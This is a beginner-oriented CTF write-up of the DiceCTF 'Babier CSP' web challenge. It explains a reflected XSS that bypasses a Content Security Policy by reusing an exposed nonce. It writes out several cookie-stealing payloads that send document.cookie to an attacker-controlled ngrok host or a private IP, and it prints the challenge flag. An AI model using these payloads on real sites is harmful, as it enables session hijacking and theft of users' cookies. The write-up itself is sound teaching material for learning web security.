---
layout: post
author: Etch
title:  "DiceCTF: Babier CSP"
date:   2021-02-09 00:49:32 -0500
categories: CTF-writeup
ctf-category: WEB
---

# Babier CSP (web):


Babier was a nice admin bot xss challenge for beginners such as myself. Sometimes when I read through writeups, I have so little knowledge of what's going on that I 
don't truly learn much from them. This writeup's goal is to go very in depth so people just starting out will be able to easily follow through and try this on their own
<br/><br/>

    notdeghost
    349 solves / 107 points

    Baby CSP was too hard for us, try Babier CSP.

    The admin will set a cookie secret equal to config.secret in index.js.

<br/>
[Baby CSP](https://ctftime.org/writeup/25867)

[babier-csp.dicec.tf](https://babier-csp.dicec.tf/)

[Admin-bot](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp)

[index.js](/assets/babier_csp/index.js)  
<br />


## Inital thoughts


From reading the description, my first thought was that the admin bot would set my cookie to the flag if I gave it a vulnerable URL to the babier-csp site.

I had just looked over the baby csp challenge the other day and knew that challenge involved an [XSS](https://owasp.org/www-community/attacks/xss/) in a [GET param](https://en.ryte.com/wiki/GET_Parameter)
<br /><br />


## Babier CSP Portion

I decided to look at the babier site first, and check out the admin bot after. When we open the site, we are greeted with this 


![fruit](/assets/babier_csp/view_fruit.png)


<br />
Clicking view fruit then displays a random fruit in big letters.
<br /><br />


![orange](/assets/babier_csp/orange.png)



The first thing I noticed was that the fruit was displayed by a GET request with parameter name. I decided to look through the index.js file. I immediately noticed the fruit listings, and it seemed that they were randomly chosen.


![index_javascript](/assets/babier_csp/index_javascript.png)


I also saw that there was a "SECRET" variable holding config.secret that was mentioned in the description, and a secret directory. I tried accessing the secret directory, but received the response "Cannot GET /secret".




Nothing looked too promising in the file (although nonce should have), so I moved on to trying some XSS. I sent a simple XSS as the paramter for name in the url


```<script>alert(1)</script>```


This should have a javascript alert box pop up with the value 1 in it.


![first_xss](/assets/babier_csp/first_xss.png)


No luck. However, when I opened google chrome's [console](https://developers.google.com/web/tools/chrome-devtools/open) I noticed an error. It said it couldn't execute my script because it violated a [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP), and it said [nonce](https://stackoverflow.com/questions/42922784/what-s-the-purpose-of-the-html-nonce-attribute-for-script-and-style-elements) was required. I went to the line in the javscript where the error occured, and noticed there was a value for nonce. 


![nonce](/assets/babier_csp/nonce_exposed.png)


A quick google search, and I learn that nonce is essentially a key that must be used to execute script and style elements if specified. Luckily the key was sitting right in front of me.

**"g+ojjmb9xLfE+3j9PsP/Ig=="**

Okay, let's try it again, but this time we'll specify the nonce.

![html_encode](/assets/babier_csp/html_encode.png)


Still no luck, but when we look at the nonce in the script we injected, both '+' signs are missing... Let's try making the '+' signs [URL encoded](https://www.w3schools.com/tags/ref_urlencode.ASP)


![xss_success](/assets/babier_csp/xss_success.png)


It worked! Simply changing '+' to the url encoded value '%2b' allowed me to insert my own script.
<br /><br />



## Getting The Cookie

Okay, so we had a successful XSS on the babier webpage, now time to move onto the admin page. This is where I got stuck for awhile.


![admin](/assets/babier_csp/admin.png)


I thought that if I just gave the admin bot a vulnerable url to the babier page, it would set my cookie.
After trying various payloads similar ```alert(document.cookie)``` I decided to get clarification from the creator on whether I was getting my cookie set, or stealing the cookie.
They clarified that my goal was to steal the admin bot's cookie.
As it turns out, if there is an admin bot, there is a very very good chance your goal is to steal their cookie. 

Googling "stealing admin bot cookie" pretty much immediately brought up the solution.
I found a writeup in which they created an xss that redirected the administrator to their server. 
They also appended the redirected user's cookie on the end of the url


[``` <img src=x onerror=this.src='http://myserver/?c='+document.cookie>```](https://codeburst.io/joe-web-challenge-google-ctf-2017-7120205a1297)

This was their solution, and it was *almost* exactly what I was looking for. 
However we couldn't use an img tag because we needed a nonce to be included in our xss, and only script and style elements can include them as far as I know


I also noticed that they redirected to their own personal server. Being able to host a server is part of a lot of web challenges, and everyone interested in the category should learn to do so.
I personally recommend hosting a local server with python, and then making it public with [ngrok](https://ngrok.com/). If you need to host a single page payload, [tiiny.host](tiiny.host) works very well too
<br /><br />


### Setting up a server

Since your server won't need any code, you can simply just boot up a server, and look at incoming requests.

*Note: Steps 1 and 2 are optional to show you how to connect a local server to your ngrok server, but useful for future challenges*



1. Create a blank directory where you want your webserver to be

    ```mkdir webserver```

2. Run a local webserver in that directory

    ```python3 -m http.server```

3. Run your ngrok server and specify port 8000 since that is the default for python servers

    ```./ngrok http 8000```



Your webserver is now up and running! You can go to ngrok's web interface to see requests and responses to your server. 
This is where we'll be able to see the cookie when we steal it from the admin.


If you performed all 3 steps, when you enter your url into your browser, it'll show a directory listing with nothing in it.
This is becuase there is nothing on your webserver. This is fine.


If only did step 3, it will say your connection was tunneled, but it couldn't connect.
This is because you aren't running a server on the port ngrok is connected to. This is also fine.
<br /><br />


## Redircting the admin to your server

I decided to go with script since that's what I'm more comfortable working with

I created the following payload based off of the image one. 

```https://babier-csp.dicec.tf/?name=%3Cscript%20nonce=%22g%2bojjmb9xLfE%2b3j9PsP/Ig==%22%20src=%22https://02570c54389d.ngrok.io/%22%2bdocument.cookie%3E%3C/script%3E```

Which decodes to 

```https://babier-csp.dicec.tf/?name=<script nonce="g+ojjmb9xLfE+3j9PsP/Ig==" src="https://02570c54389d.ngrok.io/"+document.cookie></script>```


If we send it to the admin bot, and we check our ngrok interface, we can see their request! (You can also see it in your terminals running ngrok/python)


![first_ngrok](/assets/babier_csp/ngrok_first.png)


The only issue is that the cookie isn't attached. If we try this xss on our own, it appears that its trying to use ```+document.cookie``` as a parameter for the script tag.


![fail_cookie](/assets/babier_csp/fail_cookie.png)


Looks like we'll have to have the redirect inside of our script tags


After some googling, we get a few payloads, some of them contain image elements within the javascript, but we know those won't work since they don't have nonce!
We do find one that looks interesting though. It uses document.location inside of the script tags

[```<script type=“text/javascript”>document.location=“http://192.168.0.48:5000/?c=“+document.cookie;</script>```](https://medium.com/@laur.telliskivi/pentesting-basics-cookie-grabber-xss-8b672e4738b2)

Let's try it with our own webserver, and get rid of the '?c=' since we won't need it

```<script nonce="g+ojjmb9xLfE+3j9PsP/Ig==">document.location="http://02570c54389d.ngrok.io/"+document.cookie;</script>```

I'm going to [encode the payload](https://meyerweb.com/eric/tools/dencoder/) since this is simpler than going through for each '+' sign

```https://babier-csp.dicec.tf/?name=%3Cscript%20nonce%3D%22g%2Bojjmb9xLfE%2B3j9PsP%2FIg%3D%3D%22%3Edocument.location%3D%22https%3A%2F%2F83ccfe8852bc.ngrok.io%2F%22%2Bdocument.cookie%3B%3C%2Fscript%3E```


![secret](/assets/babier_csp/secret.png)


We got the cookie! Now remember that SECRET variable and directory we saw earlier in the json? This is the value for it! Head back to the babier site, and go to the secret directory. Just add [```4b36b1b8e47f761263796b1defd80745```](https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/) to the end of the url


It says we should view source, so I press F12 in chrome, and there's the flag! 


![end](/assets/babier_csp/end.png)



dice{web_1s_a_stat3_0f_grac3_857720}



